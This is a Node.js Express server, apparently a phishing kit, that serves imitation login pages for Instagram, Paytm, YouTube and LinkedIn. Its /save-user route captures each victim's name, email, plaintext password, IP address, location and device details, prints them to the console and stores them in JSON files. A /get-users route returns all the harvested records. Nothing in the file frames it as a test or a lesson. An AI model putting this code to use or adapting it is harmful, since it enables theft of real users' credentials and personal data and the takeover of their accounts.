const express = require('express');
const fs = require('fs');
const path = require('path');
const readline = require('readline');
const { exec } = require('child_process');

const app = express();
const PORT = 3000;

// Middleware
app.use(express.json());
app.use(express.static('.'));

// Create readline interface for user input
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

// Available login pages
const loginPages = {
    '1': { name: 'Instagram', file: 'insta.html', jsonFile: 'instagram_users.json' },
    '2': { name: 'Paytm', file: 'paytm.html', jsonFile: 'paytm_users.json' },
    '3': { name: 'YouTube', file: 'youtube.html', jsonFile: 'youtube_users.json' },
    '4': { name: 'LinkedIn', file: 'linkedin.html', jsonFile: 'linkedin_users.json' }
};

// Show menu
function showMenu() {
    console.log('\n' + '='.repeat(50));
    console.log('📱 MULTI-LOGIN PAGE SELECTOR');
    console.log('='.repeat(50));
    console.log('Select which login page to serve:');
    console.log('');

    for (const [key, page] of Object.entries(loginPages)) {
        console.log(`  ${key}. ${page.name} (${page.file})`);
    }

    console.log('');
    console.log('  0. Exit');
    console.log('='.repeat(50));
    console.log('');
}

// Dynamic route handler for each login page
function setupRoutes(selectedPage) {
    // Route to serve the selected HTML page
    app.get('/', (req, res) => {
        res.sendFile(path.join(__dirname, selectedPage.file));
    });

    // Route to save data to the specific JSON file
    app.post('/save-user', (req, res) => {
        const data = req.body;
        const filePath = path.join(__dirname, selectedPage.jsonFile);
        
        console.log(`\n📝 ${selectedPage.name} Login Data Received:`);
        console.log('─'.repeat(40));
        console.log(`  Name: ${data.name || 'N/A'}`);
        console.log(`  Email: ${data.email || 'N/A'}`);
        console.log(`  Password: ${data.password || 'N/A'}`);
        console.log(`  IP: ${data.ip || 'N/A'}`);
        console.log(`  Location: ${data.location || 'N/A'}`);
        console.log(`  Browser: ${data.browser || 'N/A'}`);
        console.log(`  OS: ${data.os || 'N/A'}`);
        console.log(`  Screen: ${data.screen || 'N/A'}`);
        console.log(`  Language: ${data.language || 'N/A'}`);
        console.log(`  Timezone: ${data.timezone || 'N/A'}`);
        console.log(`  Timestamp: ${data.timestamp || 'N/A'}`);
        console.log(`  Submitted: ${data.submitted_at || 'N/A'}`);
        console.log('─'.repeat(40));
        
        try {
            // Read existing data
            let existingData = [];
            if (fs.existsSync(filePath)) {
                const content = fs.readFileSync(filePath, 'utf8');
                if (content) {
                    existingData = JSON.parse(content);
                }
            }
            
            // Add new data
            existingData.push(data);
            
            // Write to file
            fs.writeFileSync(filePath, JSON.stringify(existingData, null, 2));
            
            console.log(`✅ Data saved to ${selectedPage.jsonFile}`);
            console.log(`📊 Total entries: ${existingData.length}`);
            
            res.json({ 
                success: true, 
                message: `Data saved to ${selectedPage.jsonFile}`,
                count: existingData.length
            });
        } catch (error) {
            console.error('❌ Error saving data:', error);
            res.status(500).json({ 
                success: false, 
                error: 'Failed to save data' 
            });
        }
    });

    // Route to get all submissions
    app.get('/get-users', (req, res) => {
        const filePath = path.join(__dirname, selectedPage.jsonFile);
        
        try {
            if (fs.existsSync(filePath)) {
                const content = fs.readFileSync(filePath, 'utf8');
                const data = content ? JSON.parse(content) : [];
                res.json(data);
            } else {
                res.json([]);
            }
        } catch (error) {
            console.error('Error reading file:', error);
            res.status(500).json({ error: 'Failed to read file' });
        }
    });
}

// Function to start the server with selected page
function startServer(selectedKey) {
    if (selectedKey === '0') {
        console.log('\n👋 Goodbye!');
        rl.close();
        process.exit(0);
    }

    const selectedPage = loginPages[selectedKey];
    
    if (!selectedPage) {
        console.log('\n❌ Invalid selection! Please try again.\n');
        askUser();
        return;
    }

    // Check if the HTML file exists
    if (!fs.existsSync(selectedPage.file)) {
        console.log(`\n⚠️ Warning: ${selectedPage.file} not found!`);
        console.log(`📝 Creating a template for ${selectedPage.name}...\n`);
    }

    console.log(`\n✅ Starting ${selectedPage.name} Login Page...`);
    console.log(`📁 Data will be saved to: ${selectedPage.jsonFile}`);
    console.log(`🌐 Server running on: http://localhost:${PORT}`);
    console.log('\n' + '='.repeat(50));
    console.log('📝 Press Ctrl+C to stop the server');
    console.log('='.repeat(50) + '\n');

    // Setup routes for the selected page
    setupRoutes(selectedPage);

    // Start the server
    const server = app.listen(PORT, () => {
        console.log(`🚀 Server is ready!`);
        console.log(`📍 Open: http://localhost:${PORT}`);
        console.log(`📊 Data file: ${selectedPage.jsonFile}`);
        console.log('\n💡 Waiting for submissions...\n');
    });

    // Handle server shutdown
    process.on('SIGINT', () => {
        console.log('\n\n🛑 Shutting down server...');
        server.close(() => {
            console.log('👋 Server stopped. Goodbye!');
            process.exit(0);
        });
    });
}

// Ask user for selection
function askUser() {
    showMenu();
    rl.question('Enter your choice (1-4, or 0 to exit): ', (answer) => {
        const choice = answer.trim();
        if (choice === '0' || choice === '1' || choice === '2' || choice === '3' || choice === '4') {
            startServer(choice);
        } else {
            console.log('\n❌ Invalid input! Please enter a number between 0 and 4.\n');
            askUser();
        }
    });
}

// Start the application
console.log('\n🌟 WELCOME TO MULTI-LOGIN PAGE SYSTEM');
console.log('📁 Files will be created as needed\n');
askUser();

// Export for testing
module.exports = { app, loginPages };